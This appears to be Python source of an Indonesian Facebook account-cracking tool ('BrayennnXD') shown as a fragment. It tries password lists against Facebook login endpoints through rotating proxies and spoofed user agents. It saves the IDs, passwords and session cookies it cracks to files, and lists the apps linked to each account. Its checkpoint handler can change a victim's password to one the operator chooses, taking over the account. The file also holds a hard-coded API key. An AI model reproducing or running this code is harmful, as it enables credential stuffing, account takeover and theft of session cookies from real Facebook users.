					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#--------------------[ METODE X ]-----------------#
def colmek1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]X[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://x.facebook.com/login.php?skip_api_login=1&api_key=123481471329046&kid_directed_site=0&app_id=123481471329046&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D123481471329046%26state%3D97cgz67n%26redirect_uri%3Dhttps%253A%252F%252Fplogin.jd.id%252Fcgi-bin%252Fmlogin%252Ffacebookcallback%26scope%3Demail%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7da29ea1-31ba-4b07-a30d-9fdafc8bfdd7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fplogin.jd.id%2Fcgi-bin%2Fmlogin%2Ffacebookcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D97cgz67n%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#--------------------[ METODE D ]-----------------#
def colmek2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]D[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'd.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://d.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://d.facebook.com/login.php?skip_api_login=1&api_key=166363243399924&kid_directed_site=0&app_id=166363243399924&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D166363243399924%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fthirdparty.aliexpress.com%252Ffbcallback.htm%26scope%3Demail%252Cpublic_profile%252Cuser_messenger_contact%26messenger_page_id%3D335963307560%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7720cbb3-6ccb-48be-8820-8775c6c7b67d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fthirdparty.aliexpress.com%2Ffbcallback.htm%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'd.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ CEK APLIKASI ]--------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

def ceker(idf,pw):
	sess=requests.Session()
	data={}
	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
	sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"ua"})
	soup=parse(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	response=parse(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
	try:
		link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
		responses=parse(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
		cek=[cek.text for cek in responses.find_all("option")]
		if len(cek)==0:pass
		else:
			for opsi in range(len(cek)):ops.append(print("[bold white]"+cek[opsi]))
	except:pass
	if len(ops)==0:pass
	print (' [+] Columns(ops)')
                              
#-----------------------[ DEF CEK OPSI ]--------------------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
day = datetime.now().strftime("%d-%b-%Y")

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [P]
warna = random.choice(acak)
til ="\033[0m [+] "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	prints(Panel(f"""Copy Nama File Hasil Crack Di Bawah Ini Kemudian Pastekan Di Bawah Untuk Cek Opsi""",width=90,style=f"bold white"))
	for file in dirs:
		prints(Panel(f"""{(file)}""",width=90,style=f"bold white"))
	try:
		prints(Panel(f"""Copy Nama File Di Atas Kemudian Tempel Di Bawah Ini Contoh : {day}.txt""",width=90,style=f"bold white"))
		opsi()
	except IOError:
		prints(Panel(f"""Tidak Ada File Untuk Di Cek Silahkan Crack Dulu""",width=90,style=f"bold white"))
		exit()

def opsi():
	CP = ("CP/")
	romi = console.input(f" [+] Tempelkan Pilihan : ")
	if romi == "":
		prints(Panel(f""" [+] Isi Yang Benar""",width=90,style=f"bold white"))
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit(prints(Panel(f"""Nama File {(romi)} Tidak Di Temukan""",width=90,style=f"bold white")))
	prints(Panel(f"""Sebelum Melanjutkan Hidupkan Mode Pesawat Selama 10 Detik""",width=90,style=f"bold white"))
	pw=console.input(f" [+] Ubah Password Ketika Tab Yes y/n : ")
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2=console.input(f" [+] Masukan Password Baru : ")
		if len(pw2) <= 5:
			prints(Panel(f"""Sandi Minimal 6 Karakter""",width=90,style=f"bold white"))
		else:
			pwbaru.append(pw2)
	prints(Panel(f"""Total akun : {str(len(file_cp))}""",width=90,style=f"bold white"))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		prints(Panel(f"""[{(str(nomor))}] Cek Sesi Akun = {akun}""",width=90,style=f"bold white"));jeda(0.10)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue

data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(day), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s%s \033[0m [+] Terdapat %s%s%s \033[0mOpsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(day), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
				else:
					print("\r%s%s \033[0m\x1b[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login		"%(H,til))
					tree = Tree(" ",guide_style=f"{color_ok}")
					tree.add(Panel(f"{ua}",width=83,padding=(0,2),style=f"{color_ok}"))
					prints(tree)
					open('OK/OK-%s.txt' %(day), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print(Panel("\r%s\033[0m akun terpasang autentikasi dua faktor			"%(M)))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(day), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s %s"%(M,oh))
	else:
		tree = Tree(" ",guide_style=f"bold white")
		tree.add(Panel(f"login gagal, silahkan cek kembali id dan kata sandi",width=83,padding=(0,2),style=f"bold white"))
		prints(tree)
		  
def scarpping_ua():
    
    
    
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    
    
    
 
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
		  
#-----------------------[ DEFF SCRAPT METODE ]--------------------#
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel
done = False 
results = [] 

def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()
def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(':')[1]
        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
        print('\n [+] Program Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
    except Exception as e:
        print('\n\n [+] Program Selesai Dalam Waktu 0 Detik\n')

class get_data_web:
    
    def __init__(self):
        self.xyz = requests.Session()
        url = input(' [+] Masukkan URL : ')
        print('\n [1] Source Payload')
        print(' [2] Parsed Payload')
        print(' [3] Source Code Post Requests')
        self.tanya = input(' [+] Pilih : ')
        self.domain = url.split('/')[2]
        self.get_form(url)
       
    def get_form(self,url):
        req = self.xyz.get(url)
        raq = bs(req.content,'html.parser')
